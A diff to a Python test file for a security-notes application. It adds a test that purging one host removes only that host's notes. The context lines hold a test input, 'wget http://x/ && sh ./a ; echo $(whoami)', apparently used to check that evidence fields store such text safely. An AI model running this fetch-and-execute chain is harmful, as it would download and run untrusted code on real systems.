@@ -327,3 +327,13 @@ class InputGuardTests(NotesFixture):
         self.assertFalse(err, data)
         err, data = self.finding_note(evidence='wget http://x/ && sh ./a ; echo $(whoami)', observation='confirmed')
         self.assertFalse(err, data)
+
+
+class HostLifecycleTests(NotesFixture):
+    def test_removing_a_host_removes_its_notes_and_keeps_other_hosts_notes(self):
+        from agentapi import host_manage
+        self.host_note(text='goes')
+        HostNote.objects.create(project=self.proj, host='other.example.com', text='stays')
+        counts, _dirs = host_manage._purge(self.proj, HOST)
+        self.assertEqual(counts['host_notes'], 1)
+        self.assertEqual(list(HostNote.objects.values_list('text', flat=True)), ['stays'])
